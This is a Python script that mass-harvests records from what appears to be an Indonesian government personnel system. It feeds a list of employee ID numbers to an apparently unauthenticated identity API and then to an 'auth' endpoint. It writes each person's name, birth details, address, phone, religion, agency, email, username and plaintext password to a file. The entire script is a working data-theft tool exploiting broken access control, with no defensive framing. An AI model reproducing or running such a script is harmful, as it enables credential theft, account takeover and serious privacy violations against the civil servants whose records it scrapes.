import requests
import json

CHUNK_SIZE = 1000000 # 1.000.000 bytes === 1 mb


def read_file_as_chunks ( file_name, chunk_size, callback, return_whole_chunk = False ):
        def read_by_chunks ( file_obj, chunk_size = 5000 ):
                while True:
                        data = file_obj.read ( chunk_size )

                        if not data:
                                break

                        yield data

        fp = open ( file_name )

        data_left_over = None

        for chunk in read_by_chunks ( fp ):
                if data_left_over:
                        current_chunk = data_left_over + chunk
                else:
                        current_chunk = chunk

                lines = current_chunk.splitlines ()

                if current_chunk.endswith ( "\n" ):
                        data_left_over = None
                else:
                        data_left_over = lines.pop ()

                if return_whole_chunk:
                        callback ( data = lines, eof = False, file_name = file_name )
                else:
                        for line in lines:
                                callback ( data = line, eof = False, file_name = file_name )

                                pass

        if data_left_over:
                current_chunk = data_left_over

                if current_chunk is not None:
                        lines = current_chunk.splitlines ()

                        if return_whole_chunk:
                                callback ( data = lines, eof = False, file_name = file_name )
                        else:
                                for line in lines:
                                        callback ( data = line, eof = False, file_name = file_name )

                                        pass

        callback ( data = None, eof = True, file_name = file_name )


def get_identitas ( nip = "" ):
        try:
                res = requests.get ( url = "https://simpeg.xxxxxxxx.go.id/api/identitas", params = {
                        "nip": nip,
                } )

                return res.content
        except requests.exceptions.RequestException:
                print ( "HTTP Request failed" )


def get_login ( email = "" ):
        try:
                res = requests.get ( url = "https://simpeg.xxxxxxxx.go.id/api/auth", params = {
                        "email": email,
                } )

                return res.content
        except requests.exceptions.RequestException:
                print ( "HTTP Request failed" )


def run_proccess ( data, eof, file_name ):
        if not eof:
                r = get_identitas ( data.strip () )

                s = json.loads ( r )

                if len ( s ) > 0:
                        try:
                                u = get_login ( s[ 0 ][ "email" ].strip () )

                                v = json.loads ( u )

                                if len ( v ) > 0:
                                        print ( "Memproses NIM " + s[ 0 ][ "nip" ] )

                                        with open ( "res.txt", "a" ) as f0:
                                                f0.write ( "NIP: " + s[ 0 ][ "nip" ] + "\n" )
                                                f0.write ( "Nama: " + s[ 0 ][ "nama" ] + "\n" )
                                                f0.write ( "TTL: " + s[ 0 ][ "tempat_lahir" ] + ", " + s[ 0 ][ "tanggal_lahir" ] + "\n" )
                                                f0.write ( "Instansi: " + s[ 0 ][ "instansi" ] + "\n" )
                                                f0.write ( "Foto: " + s[ 0 ][ "images" ] + "\n" )
                                                f0.write ( "Status PNS: " + s[ 0 ][ "status_pns" ] + "\n" )
                                                f0.write ( "Alamat: " + s[ 0 ][ "alamat" ] + "\n" )
                                                f0.write ( "Telepon: " + s[ 0 ][ "telpon" ] + "\n" )
                                                f0.write ( "Golongan: " + s[ 0 ][ "golongan" ] + "\n" )
                                                f0.write ( "Agama: " + s[ 0 ][ "agama" ] + "\n" )
                                                f0.write ( "Pangkat: " + s[ 0 ][ "pangkat" ] + "\n" )
                                                f0.write ( "Jenis Kelamin: " + s[ 0 ][ "jenis_kelamin" ] + "\n" )
                                                f0.write ( "Satuan Kerja: " + s[ 0 ][ "satker" ] + "\n" )
                                                f0.write ( "Unit Kerja: " + s[ 0 ][ "unker" ] + "(" + s[ 0 ][ "kode_unker" ] + ")" + "\n" )
                                                f0.write ( "Email: " + v[ 0 ][ "email" ] + "\n" )
                                                f0.write ( "Username: " + v[ 0 ][ "username" ] + "\n" )
                                                f0.write ( "Password: " + v[ 0 ][ "password" ] + "\n\n" )
                                else:
                                        print ( "Data Login " + data.strip () + " Tidak Ditemukan." )
                        except:
                                print ( "Respon tidak diketahui: " + data.strip () )
                else:
                        print ( "Data NIM " + data.strip () + "Tidak Ditemukan." )
        else:
                print ( "Done." )


if __name__ == "__main__":
        tmp = None

        read_file_as_chunks ( "list.txt", chunk_size = CHUNK_SIZE, callback = run_proccess )
